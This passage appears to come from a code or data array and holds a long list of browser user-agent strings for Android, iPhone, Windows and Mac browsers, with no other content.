"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; CPH1969) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; Spice F301 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J210F Build/MMB29Q) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.2 Chrome/63.0.3239.111 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) GSA/54.0.204505792 Mobile/16G102 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/65.0.3325.152 Mobile/16G102 Safari/604.1",
"Mozilla/5.0 (Linux; Android 5.1.1; HUAWEI M2-A01L Build/HUAWEIM2-A01L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; S4Z Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G900FD) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-S5282 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 7.0; P00L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.64 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; Ixion ML350) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-P601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36 OPR/44.0.2510.857",
"Mozilla/5.0 (Linux; Android 9; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.2.338.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0.2; SGP621) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; GT-P5210) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 7.0; WAS-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.7.115.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; X55 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; Power Plus 3 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-J530FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G900F Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36 OPR/53.1.2569.142848",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/12.0 YaBrowser/18.4.3.119.10 Mobile/16F203 Safari/604.1",
"Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; v89_gq2008s Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 7.0; Moto C Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.1; NX591J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; ZTE Blade A5 2019RU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; TECNO KA7O Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0.2; LG-H522) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; LG-M210) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; JSN-L42) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; moto e6 play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SH-01K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Nokia 5.1 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SO-01K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.167",
"Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L31) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-G9500 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; ANE-LX1 Build/HUAWEIANE-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J120F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-J710GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; RNE-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; LYO-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.56 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-J337P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; BND-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-J701M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; BLN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-N950N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; L270) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 YaBrowser/19.1.2.337.01 Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; K016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-J730FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; RNE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; YAL-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-A320FL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; KSA-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI LUA-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; DUA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; E5533) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; IMPRESS CLICK) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; ZTE Blade A7 2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; LG-K430) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-A260G Build/OPR6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; moto x4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG-SM-J727A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; moto g(7) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; ONEPLUS A6000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; KFMUWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/75.3.60 like Chrome/75.0.3770.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44",
"Mozilla/5.0 (Linux; Android 4.4.4; SM-G360H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.172",
"Mozilla/5.0 (Linux; Android 7.1.1; CPH1719) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.1; CPH1801) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.2991.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; SM-T560) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.66 Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; INE-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/85.0.130 Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; ASUS_Z00AD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; MYA-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/85.0.130 Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; Ilium X110 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.109 Mobile Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:52.9) Gecko/20100101 Goanna/3.4 Firefox/52.9 ArcticFox/27.9.19",
"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44",
"Mozilla/5.0 (Linux; Android 9; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; moto g(8) plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; RMX1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; GM 8 d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 CCleaner/79.0.3067.82",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Avast/77.2.2167.120",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 AVG/79.0.3064.81",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 CCleaner/79.0.3067.82",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 AVG/79.0.3064.81",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 CCleaner/79.0.3066.82",
"Mozilla/5.0 (Linux; Android 9; Moto Z3 Play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; BQ-5512L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; BV5800Pro_RU Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; F3111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B72 Zalo iOS / 278",
"Mozilla/5.0 (Linux; Android 6.0; Hisense L675) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.132 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; TECNO KB2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A705MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-T331) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; M5 Note) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; Lenovo TAB 2 A7-30GC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; Micromax E481 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.1; CPH1727) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-A300FU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; JSN-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; BND-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.3.318.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; Swift 2 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; G3312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; PSP5511DUO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; FIG-LA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 OPR/35.0.2066.92",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J510H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J500F Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; G3112) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; Lenovo TB2-X30L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-A530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J200H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; Ixion XL240) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 YaBrowser/18.11.1.1011.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; C103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; Che2-L11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; Che2-L11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm; Android 9; KSA-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.7.115.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; Just5-SPACER2s Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A7600-H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; CRO-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; meizu C9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 7.0; BAH-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.7.115.01 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-T805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-A520F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; ASUS_X00PD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; Lenovo TB3-X70F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; m2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; Infinix X571) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:45.9) Gecko/20100101 Goanna/3.0 Firefox/45.9 PaleMoon/27.1.2",
"Mozilla/5.0 (Linux; Android 9; VS996) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-A105FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; DIG-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; PSP5506DUO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; HAWEEL_H1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-G9500 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 YaBrowser/19.9.3.314 Yowser/2.5 Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.79 Mobile/16G102 Safari/602.1",
"Mozilla/5.0 (Linux; Android 9; SM-A600F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
